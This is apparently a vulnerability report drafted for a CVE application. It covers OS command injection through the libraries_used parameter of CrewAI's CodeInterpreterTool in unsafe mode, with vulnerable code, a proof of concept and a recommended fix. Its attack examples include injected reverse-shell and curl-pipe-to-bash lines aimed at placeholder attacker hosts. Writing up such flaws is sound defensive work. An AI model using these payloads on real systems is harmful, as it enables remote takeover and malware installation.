# CVE Application: CrewAI CodeInterpreterTool Command Injection Vulnerability

## Vulnerability Summary

**Product**: CrewAI (crewai-tools)
**Affected Version**: <= 1.0.0a2
**Vulnerability Type**: OS Command Injection (CWE-78)
**CVSS v3.1 Score**: 9.8 (Critical)
**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Description

The CodeInterpreterTool in crewai-tools contains a critical command injection vulnerability in the `unsafe_mode` execution path. When `unsafe_mode=True`, the `run_code_unsafe()` method uses `os.system()` with unsanitized user input from the `libraries_used` parameter to install Python packages. This allows an attacker to inject arbitrary shell commands using command separators like `&&`, `;`, or `|`.

## Affected Component

**File**: `crewai-tools/src/crewai_tools/tools/code_interpreter_tool/code_interpreter_tool.py`

**Vulnerable Code** (lines 343-360):
```python
def run_code_unsafe(self, code: str, libraries_used: list[str]) -> str:
    """Runs code directly on the host machine without any safety restrictions.
    WARNING: This mode is unsafe and should only be used in trusted environments
    with code from trusted sources.
    """
    Printer.print("WARNING: Running code in unsafe mode", color="bold_magenta")

    # Install libraries on the host machine
    for library in libraries_used:
        os.system(f"pip install {library}")  # ← VULNERABILITY: Direct command injection

    # Execute the code
    try:
        exec_locals = {}
        exec(code, {}, exec_locals)  # noqa: S102
        return exec_locals.get("result", "No result variable found.")
    except Exception as e:
        return f"An error occurred: {e!s}"
```

## Proof of Concept

```python
#!/usr/bin/env python3
import sys
sys.path.insert(0, '/path/to/crewai-tools/src')

from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import CodeInterpreterTool

# Create tool with unsafe mode enabled
tool = CodeInterpreterTool(unsafe_mode=True)

# Inject arbitrary commands using library name
malicious_library = 'requests && echo "VULNERABLE" > /tmp/crewai_poc.txt'

result = tool.run(
    code='result = "normal execution"',
    libraries_used=[malicious_library]
)

# Verify command execution
import os
if os.path.exists('/tmp/crewai_poc.txt'):
    with open('/tmp/crewai_poc.txt', 'r') as f:
        print(f"Command executed: {f.read()}")  # Output: VULNERABLE
```

**Additional Attack Examples**:
```python
# Execute whoami
tool.run(code='x=1', libraries_used=['requests && whoami > /tmp/id.txt'])

# Establish reverse shell
tool.run(code='x=1', libraries_used=['requests && nc -e /bin/bash attacker.com 4444'])

# Download and execute malware
tool.run(code='x=1', libraries_used=['requests && curl http://evil.com/shell.sh | bash'])
```

## Impact

An attacker can execute **arbitrary system commands** with the privileges of the process running the CrewAI application, leading to:

1. **Complete System Compromise** - Execute any shell command on the host
2. **Reverse Shell** - Establish remote access to the compromised system
3. **Data Exfiltration** - Steal sensitive files, credentials, and data
4. **Persistence** - Install backdoors, modify system configurations
5. **Lateral Movement** - Attack other systems on the network

## CVSS v3.1 Score Breakdown

**Base Score**: 9.8 (Critical)

| Metric | Value | Description |
|--------|-------|-------------|
| Attack Vector (AV) | Network | Exploitable over network |
| Attack Complexity (AC) | Low | No special conditions required |
| Privileges Required (PR) | None | No authentication required |
| User Interaction (UI) | None | No user interaction required |
| Scope (S) | Unchanged | Vulnerability does not change scope |
| Confidentiality (C) | High | Full access to all system data |
| Integrity (I) | High | Can modify any system data |
| Availability (A) | High | Can disrupt system availability |

## Attack Scenario

1. Attacker gains access to CrewAI agent with CodeInterpreterTool enabled
2. Attacker sets `unsafe_mode=True` (default is `False`, but can be overridden)
3. Attacker provides malicious library name with command injection payload
4. Tool executes `os.system(f"pip install {malicious_input}")` without sanitization
5. Shell interprets command separators and executes injected commands
6. System is fully compromised

## Remediation

### Recommended Fix

```python
import shlex
import subprocess
import re

def run_code_unsafe(self, code: str, libraries_used: list[str]) -> str:
    """Runs code directly on the host machine with input validation."""
    Printer.print("WARNING: Running code in unsafe mode", color="bold_magenta")

    for library in libraries_used:
        # FIX 1: Validate library name format
        if not self._validate_library_name(library):
            raise ValueError(f"Invalid library name: {library}")

        # FIX 2: Use subprocess with list arguments (no shell interpretation)
        result = subprocess.run(
            ['pip', 'install', library],
            capture_output=True,
            text=True,
            check=False
        )

        if result.returncode != 0:
            raise RuntimeError(f"Failed to install {library}: {result.stderr}")

    exec_locals = {}
    exec(code, {}, exec_locals)
    return exec_locals.get("result", "No result variable found.")

def _validate_library_name(self, library: str) -> bool:
    """Validate that library name only contains safe characters (PEP 508)."""
    pattern = r'^[a-zA-Z0-9](?:[a-zA-Z0-9._-]*[a-zA-Z0-9])?$'
    return bool(re.match(pattern, library))
```

### Alternative Security Measures

1. **Remove unsafe_mode entirely** - Disable the unsafe execution mode completely
2. **Require explicit authorization** - Add administrative approval for unsafe mode
3. **Use Docker exclusively** - Remove host-based execution entirely
4. **Add audit logging** - Log all unsafe mode activations and executions

## Timeline

- **2025-01-16**: Vulnerability discovered during security audit
- **2025-01-16**: Vulnerability confirmed with proof-of-concept
- **2025-01-16**: Vendor notification pending

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PEP 508: Dependency specification for Python Software Packages](https://peps.python.org/pep-0508/)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

## Credit

Discovered by: Security Researcher
Contact: [Responsible Disclosure]

## Disclaimer

This vulnerability report is provided for security research and educational purposes only. All testing was conducted in an authorized environment. Please do not use this information for unauthorized testing or malicious attacks.

---

**Report Generated**: 2025-01-16
**Status**: Pending CVE Assignment
